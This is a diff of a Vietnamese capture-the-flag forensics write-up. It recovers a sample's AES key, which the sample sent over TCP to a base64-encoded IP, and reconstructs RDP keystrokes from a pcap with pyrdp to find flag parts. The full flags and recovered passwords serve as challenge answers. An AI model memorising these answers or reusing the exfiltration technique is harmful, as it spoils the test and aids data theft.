 Sau đó gửi key ra ngoài qua 1 kết nối tcp với IP `MTcyLjI1LjI0Mi4xOTc=` và PORT `MzEyNDU=`, decrypt base64: `172.25.242.197:31245`.
 
 Giờ ta sẽ mở file pcap lên để lấy lại key.
-![image](https://hackmd.io/_uploads/Bk5ig-OHZl.png)
+![image](/images/WannaGame2025/96.png)
 
 
 Đã có key sau khi mã hóa RSA, giờ ta sẽ khôi phục key bằng cách giải mã RSA.
-![image](https://hackmd.io/_uploads/H1TaeZOHZx.png)
+![image](/images/WannaGame2025/97.png)
 
 
 Code giải mã key:
@@ -814,7 +812,7 @@ print(key)
 
 #Wu/F6K9CnxuCS0ubNF5CEceMumb155dGnV2714cOp8g=
 ```
-![image](https://hackmd.io/_uploads/HyAxZWurWe.png)
+![image](/images/WannaGame2025/98.png)
 
 
 Có được key, ta có script giải mã AES như sau:
@@ -839,15 +837,15 @@ decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
 with open("Important_File_You_Need!!!.dat", "wb") as f:
     f.write(decrypted)
     
-#MXNFQnFu...[REDACTED]...VRdg==
+#MXNFQnFuZklTR0hGemV6MzBLaFZLaVMyaThFRXd0bnh5czJFWUxRcVp0Z2tBZEM5eDZqMmxjaG5UZnh6RDRnbmVUVElRM1gzMklzMXlUVnhsQmMycUNhRExUQ1hDTFlDcG1Sa29pZkNrQnFSeW9YZVVuWlA0YlliSFhveThzNndJZERPYzBST0lUaGhYU1ZWYnJHaG15SEY4c29yRDh0WnFZcDdJazZ6bFRpTUNpNXlCVHV3cUxBNXVOWHZiVzF4SzRKQXRFTm9LU1FvR056c3JLWVJqRWV1UndrekhkOXVDVGM4aVhXZVNnb3p3U1pTclpndXljckJOR0JzMG1nNVYzRG1LZUI3OTJTeHI0blRURWczSTNuaG5jZTUydHl6a0lZTmxxZE1panJtT2hvZE83MHJpS2hjYnFnRmpTQ1JFbW1jdGFjYlVRdg==
 ```
-![image](https://hackmd.io/_uploads/SkaWWb_BWx.png)
+![image](/images/WannaGame2025/99.png)
 
 
 > Flag: W1{7h15_155_7h3_f1rr57_fl4ff4g_s3ss1on_r3c0very-4nD-Brok3n_RSA_key_with_Sm4l1_Exp0n3nt!!Chiyochiyochiyo}
 
 ## Internet Plumber
-I planted a backdoor in my friend's server and recorded his traffic. Please find out what he was doing.
+> I planted a backdoor in my friend's server and recorded his traffic. Please find out what he was doing.
 Note: The flag is splitted into 4 different parts.
 
 Challenge cho ta 1 file pcapng và 1 file sslkeylog, sử dụng file sslkeylog để có thể đọc được full traffic. Đề bài yêu cầu rằng ta hãy tìm hiểu xem user này đang làm gì, thì sau khi decrypt sslkeylog, ta có thể xem được đầy đủ các gói tin có sử dụng các protocols như http2, http3, rdp,... Vậy ta sẽ đi qua lần lượt các giao thức này để điều tra xem user đã làm gì.
@@ -855,8 +853,8 @@ Challenge cho ta 1 file pcapng và 1 file sslkeylog, sử dụng file sslkeylog 
 ### Part 1
 
 Với part 1 thì khi mình filter theo http2 và quan sát thì mình đã tìm thấy 1 request vào `gist.githubusercontent.com` có endpoint là **part1.txt**
-![image](https://hackmd.io/_uploads/HkXyfWdHZe.png)
-![image](https://hackmd.io/_uploads/HkPkG-_BWe.png)
+![image](/images/WannaGame2025/100.png)
+![image](/images/WannaGame2025/101.png)
 
 
 
@@ -865,14 +863,14 @@ Với part 1 thì khi mình filter theo http2 và quan sát thì mình đã tìm
 ### Part 2
 
 Tiếp tục với http2, em thấy user truy cập vào 1 link **pastebin** với endpoint là **YG4RUwH0** đã bị khóa và anh ta nhập mật khẩu là 123.
-![image](https://hackmd.io/_uploads/rk9gM-uHZg.png)
+![image](/images/WannaGame2025/102.png)
 
 Mình thử vào link đó và thử với pass là 123 thì không thành công. Tiếp tục tìm kiếm trong protocol này thì không thấy password đâu. Sau đó mình chuyển qua phân tích các protocols **RDP**.
 
 Đầu tiên là ta cần biết RDP là gì, thì **RDP(Remote Desktop Protocol)** là Giao thức Máy tính Từ xa của Microsoft, cho phép bạn truy cập và điều khiển máy tính khác (máy chủ) từ xa qua mạng như thể bạn đang ngồi trước màn hình đó.
 
 Filter **RDP** ta thấy nó đã ghi lại dữ liệu từ bàn phím và chuột.
-![image](https://hackmd.io/_uploads/SyTWzZOHWl.png)
+![image](/images/WannaGame2025/103.png)
 
 
 
@@ -880,23 +878,23 @@ Và mình lựa chọn công cụ **pyrdp** để phục dựng lại các phiê
 Chi tiết tại: https://github.com/GoSecure/pyrdp
 
 Đầu tiên ta sẽ export PDUs Layer 7 từ file pcapng challenge và convert từ pcapng về pcap.
-![image](https://hackmd.io/_uploads/S1OXGZOr-l.png)
+![image](/images/WannaGame2025/104.png)
 
 
 
 
 Sử dụng editcap để convert từ pcapng về pcap: `editcap -F libpcap layer7.pcapng layer7.pcap`
-![image](https://hackmd.io/_uploads/rJ7VzbuBZe.png)
+![image](/images/WannaGame2025/105.png)
 
 *Ở trên windows mình gặp chút vấn đề*
-![image](https://hackmd.io/_uploads/ryO8MZ_rWe.png)
+![image](/images/WannaGame2025/106.png)
 
 nên có thử chuyển sang linux và ok
-![image](https://hackmd.io/_uploads/r1P_GbOBWx.png)
+![image](/images/WannaGame2025/107.png)
 
 
 Tiếp theo sử dụng `pyrdp-convert` để tạo file replay.
-![image](https://hackmd.io/_uploads/ByStzWuSZg.png)
+![image](/images/WannaGame2025/108.png)
 
 Sau đây là những gì đã được nhập từ bàn phím:
 
@@ -1020,7 +1018,7 @@ DOMAIN:
 Đầu tiên, ta đã có thể thấy được user đã cd vào Documents và ghi vào 1 file **password.txt** với nội dung là **d89BcMxbQm**
 
 Lấy nó để mở khóa pastebin và có được part 2.
-![image](https://hackmd.io/_uploads/SyW3z-OB-l.png)
+![image](/images/WannaGame2025/109.png)
 
 
 **Part 2: uh_tA|<e_a_lO()k_at_tHi5_**
@@ -1206,7 +1204,7 @@ plt.show()
     
 </details>
 
-![image](https://hackmd.io/_uploads/Byex7ZuBbx.png)
+![image](/images/WannaGame2025/110.png)
 
 
 **Part 4: _06cc5fc57a}**
